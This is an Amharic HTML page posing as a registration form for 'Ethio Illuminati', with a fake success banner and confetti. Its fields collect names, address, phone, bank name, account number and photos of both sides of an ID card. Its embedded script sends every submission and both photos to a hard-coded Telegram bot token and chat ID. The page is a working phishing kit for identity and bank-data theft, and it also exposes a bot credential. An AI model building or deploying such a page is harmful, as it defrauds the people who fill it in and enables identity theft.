<!DOCTYPE html>
<html lang="am">
<head>
  <meta charset="UTF-8" />
  <title>የኢትዮ ኢሉሚኔት መመዝገቢያ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f0fdf4;
      margin: 0;
      padding: 20px;
      color: #1b4332;
      min-height: 100vh;
    }

    .flags {
      text-align: center;
      margin-bottom: 15px;
    }

    .flags span {
      font-size: 60px;
      margin: 0 12px;
    }

    h2 {
      text-align: center;
      font-size: 28px;
      color: #14532d;
      font-weight: 700;
      margin-bottom: 10px;
    }

    .intro {
      text-align: center;
      font-size: 18px;
      color: #22543d;
      background: #d1fae5;
      border-left: 6px solid #16a34a;
      border-radius: 10px;
      padding: 18px 24px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
      margin-bottom: 30px;
      font-weight: 500;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
    }

    form {
      max-width: 520px;
      margin: 0 auto 30px auto;
      background: white;
      padding: 30px 40px;
      border-radius: 14px;
      box-shadow: 0 6px 18px rgba(22, 101, 52, 0.08);
      border: 1px solid #cbd5cb;
    }

    label {
      display: block;
      margin-top: 20px;
      font-weight: 600;
      color: #1b4332;
      font-size: 15px;
      letter-spacing: 0.02em;
    }

    input, select {
      width: 100%;
      padding: 12px 14px;
      margin-top: 8px;
      border: 1.5px solid #a7f3d0;
      border-radius: 8px;
      font-size: 16px;
      color: #064e3b;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
    }

    input:focus, select:focus {
      outline: none;
      border-color: #16a34a;
      box-shadow: 0 0 8px rgba(22, 163, 74, 0.3);
    }

    button {
      margin-top: 30px;
      width: 100%;
      padding: 14px;
      background-color: #15803d;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 4px 10px rgba(22, 163, 74, 0.4);
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #16a34a;
      box-shadow: 0 6px 14px rgba(22, 163, 74, 0.5);
    }

    .success-message {
      max-width: 520px;
      margin: 20px auto;
      padding: 25px 30px;
      background: #d1fae5;
      border: 2px solid #22c55e;
      border-radius: 14px;
      color: #14532d;
      font-weight: 700;
      font-size: 20px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4);
      display: none;
      animation: fadeIn 1.2s ease-in-out forwards;
    }

    #idPreview img,
    #selfiePreview img {
      max-width: 100%;
      margin-top: 12px;
      border-radius: 10px;
      box-shadow: 0 3px 8px rgba(0,0,0,0.12);
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: scale(0.9);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }
  </style>
</head>
<body>

  <div class="flags">
    <span>🇪🇹</span>
    <span>🇺🇸</span>
  </div>

  <h2>የኢትዮ ኢሉሚኔት መመዝገቢያ</h2>

  <div class="intro" id="typedText"></div>

  <form id="regForm">
    <label>ሙሉ ስም</label>
    <input type="text" name="name" required />

    <label>የአባት ስም</label>
    <input type="text" name="father_name" required />

    <label>ክልል</label>
    <input type="text" name="region" required />

    <label>ዞን</label>
    <input type="text" name="zone" required />

    <label>ቀበሌ</label>
    <input type="text" name="kebele" required />

    <label>እድሜ</label>
    <input type="number" name="age" required />

    <label>ፆታ</label>
    <select name="sex" required>

      <option>ወንድ</option>
      <option>ሴት</option>
    </select>

    <label>ስልክ ቁጥር</label>
    <input type="tel" name="phone" required />

    <label>የባንክ ስም</label>
    <input type="text" name="bank_name" required />

    <label>የባንክ ሂሳብ ቁጥር</label>
    <input type="text" name="account_number" required />

    <label>የመታወቂያ የፊት ፎቶ</label>
    <input type="file" name="id_photo" accept="image/*" onchange="previewImage(this, 'idPreview')" required />
    <div id="idPreview"></div>

    <label>የመታወቂያ የኋላ ፎቶ</label>
    <input type="file" name="selfie_photo" accept="image/*" onchange="previewImage(this, 'selfiePreview')" required />
    <div id="selfiePreview"></div>

    <button type="submit">አስገባ</button>
  </form>

  <div class="success-message" id="successMessage">
    🎉 <span id="userName"></span> እንኳን ደስ አልዎት!<br /><br />
    ✅ ምዝገባዎ በተሳካ ሁኔታ ተጠናቋል።<br />
    🙌 እስካሁን ከ129,543 በላይ ሰዎች ተመዝግበዋል።<br />
    💚 ከኢትዮ ኢሉምናቲ ጋር ብሩህ  ህይወት ይጀምሩ።
  </div>

  <canvas id="confettiCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script>
    const botToken = '7875314076:AAEKL_ftYRUlAfK3O4lk5c4u60DFFZ3N-yo';
    const chatId = '8155585808';

    function previewImage(input, previewId) {
      const previewDiv = document.getElementById(previewId);
      previewDiv.innerHTML = '';
      const file = input.files[0];
      if (file) {
        const reader = new FileReader();
        reader.onload = function (e) {
          const img = document.createElement('img');
          img.src = e.target.result;
          previewDiv.appendChild(img);
        };
        reader.readAsDataURL(file);
      }
    }

    function typingEffect(elementId, text, speed = 50) {
      let index = 0;
      const element = document.getElementById(elementId);
      function type() {
        if (index < text.length) {
          element.innerHTML += text.charAt(index);
          index++;
          setTimeout(type, speed);
        }
      }
      type();
    }

    function triggerConfetti() {
      const duration = 3 * 1000;
      const animationEnd = Date.now() + duration;
      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 9999 };

      const interval = setInterval(function () {
        const timeLeft = animationEnd - Date.now();
        if (timeLeft <= 0) return clearInterval(interval);

        confetti({
          ...defaults,
          particleCount: 60,
          origin: { x: Math.random(), y: Math.random() - 0.2 }
        });
      }, 250);
    }

    document.addEventListener("DOMContentLoaded", () => {
      typingEffect(
        "typedText",
        "❻❻❻ እንኳን ወደ ኢትዮ ኢሉምናቲ በደህና መጡ! 💡 ብሩህ ነገ ለመገንባት የተሰማሩ ዜጎችን እንመዝግባለን። 🙏 እባክዎ መረጃዎን በትክክል ያስገቡ።"
      );
    });

    document.getElementById("regForm").addEventListener("submit", async function (e) {
      e.preventDefault();
      const form = e.target;
      const data = new FormData(form);

      const message = `
*የመመዝገቢያ መረጃ*
👤 ሙሉ ስም: ${data.get("name")}
👨 የአባት ስም: ${data.get("father_name")}
🎂 እድሜ: ${data.get("age")}
🚻 ፆታ: ${data.get("sex")}
📱 ስልክ: ${data.get("phone")}
📍 ክልል: ${data.get("region")}
📍 ዞን: ${data.get("zone")}
📍 ቀበሌ: ${data.get("kebele")}
🏦 ባንክ: ${data.get("bank_name")}
💳 መለያ: ${data.get("account_number")}
      `;

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      });

      const sendPhoto = async (photoFile, caption) => {
        const photoData = new FormData();
        photoData.append("chat_id", chatId);
        photoData.append("photo", photoFile);
        photoData.append("caption", caption);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: photoData,
        });
      };

      await sendPhoto(data.get("id_photo"), "🪪 የመታወቂያ ፎቶ");
      await sendPhoto(data.get("selfie_photo"), "🤳 ራስን የወሰደ ፎቶ");

      document.getElementById("userName").innerText = data.get("name");
      document.getElementById("successMessage").style.display = "block";
      triggerConfetti();

      form.reset();
      document.getElementById("idPreview").innerHTML = "";
      document.getElementById("selfiePreview").innerHTML = "";
    });
  </script>
</body>
</html>